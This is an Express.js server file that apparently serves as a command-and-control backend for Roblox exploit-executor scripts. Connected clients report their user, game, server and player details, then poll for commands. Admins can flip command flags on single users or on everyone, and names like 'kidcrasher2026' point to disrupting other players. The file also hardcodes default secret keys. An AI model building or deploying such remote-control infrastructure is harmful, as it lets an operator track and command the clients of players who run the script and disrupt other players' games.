'use strict';
require('dotenv').config();
const express = require('express');
const path = require('path');

const app = express();
app.use(express.json({ limit: '4mb' }));
app.use(express.static(path.join(__dirname, 'public')));
app.get('/favicon.ico', (_req, res) => res.status(204).end());
const API_KEY   = process.env.API_KEY   || 'kidcrasher2026';
const ADMIN_KEY = process.env.ADMIN_KEY || 'JamesBondUncle67';
const PORT      = process.env.PORT      || 3000;
const OFFLINE_MS = 60 * 1000;

const users = new Map();

function requireApiKey(req, res, next){
  if (req.headers['x-api-key'] !== API_KEY) return res.status(401).json({ error: 'bad api key' });
  next();
}
function requireAdminKey(req, res, next){
  if (req.headers['x-admin-key'] !== ADMIN_KEY) return res.status(401).json({ error: 'bad admin key' });
  next();
}

app.post('/api/public/heartbeat', requireApiKey, (req, res) => {
  const b = req.body || {};
  if (!b.user_id) return res.status(400).json({ error: 'missing user_id' });
  const id = String(b.user_id);
  const existing = users.get(id) || { command: {} };
  users.set(id, {
    user_id: b.user_id,
    username: b.username || existing.username,
    display_name: b.display_name || existing.display_name,
    avatar_url: b.avatar_url || existing.avatar_url,
    place_id: b.place_id,
    game_name: b.game_name,
    job_id: b.job_id,
    executor: b.executor,
    server_players: Array.isArray(b.server_players) ? b.server_players : [],
    brainrots: Array.isArray(b.brainrots) ? b.brainrots : [],
    last_seen: Date.now(),
    command: existing.command || {}
  });
  res.json({ ok: true });
});

app.get('/api/public/command', requireApiKey, (req, res) => {
  const u = users.get(String(req.query.user_id || ''));
  res.json(u ? (u.command || {}) : {});
});

app.get('/api/admin/users', requireAdminKey, (_req, res) => {
  const now = Date.now();
  const list = [];
  for (const u of users.values()) list.push({ ...u, online: (now - u.last_seen) < OFFLINE_MS });
  list.sort((a, b) => b.last_seen - a.last_seen);
  res.json({ users: list });
});

app.post('/api/admin/command', requireAdminKey, (req, res) => {
  const { user_id, field, value } = req.body || {};
  const u = users.get(String(user_id));
  if (!u) return res.status(404).json({ error: 'user not found' });
  u.command = u.command || {};
  u.command[field] = !!value;
  res.json({ ok: true });
});

app.post('/api/admin/command-all', requireAdminKey, (req, res) => {
  const { field, value } = req.body || {};
  for (const u of users.values()) {
    if (field === 'reset') u.command = {};
    else { u.command = u.command || {}; u.command[field] = !!value; }
  }
  res.json({ ok: true });
});

app.get('/', (_req, res) => res.sendFile(path.join(__dirname, 'public', 'index.html')));

app.listen(PORT, () => console.log(`✅ skid la skid 67 running on http://localhost:${PORT}`));